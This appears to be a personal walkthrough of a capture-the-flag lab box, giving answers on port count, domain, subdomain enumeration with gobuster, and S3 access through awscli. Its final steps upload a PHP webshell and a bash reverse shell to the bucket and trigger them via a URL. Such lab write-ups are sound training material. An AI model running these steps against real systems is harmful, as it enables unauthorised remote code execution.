---
title: three
draft: false
tags:
  - example-tag
---
 
1. How many TCP ports are open?
2

2. What is the domain of the email address provided in the "Contact" section of the website?
`thetoppers.htb`

3. In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?
/etc/hosts

4. Which sub-domain is discovered during further enumeration?
`s3.thetoppers.htb`


`gobuster vhost -u http://thetoppers.htb -w ~/Downloads/subdomains-top1million-5000.txt --append-domain`

5. Which service is running on the discovered sub-domain?
amazon s3

6. Which command line utility can be used to interact with the service running on the discovered sub-domain?
`awscli`

7. Which command is used to set up the AWS CLI installation?
`aws configure`

8. What is the command used by the above utility to list all of the S3 buckets?
`aws s3 ls`

`aws --endpoint=http://s3.thetoppers.htb s3 ls`

9. This server is configured to run files written in what web scripting language?
php

10. Getting the root flag...
	1. Upload a php webshell to the server
	`aws --endpoint=http://s3.thetoppers.htb s3 cp phpshell.php s3://thetoppers.htb`
	2.  Upload a bash reverse shell
	`aws --endpoint=http://s3.thetoppers.htb s3 cp rev-shell.sh s3://thetoppers.htb`
	3. Run the reverse shell
	(in the browser) `http://10.129.135.182/phpshell.php?cmd=bash%20rev-shell.sh`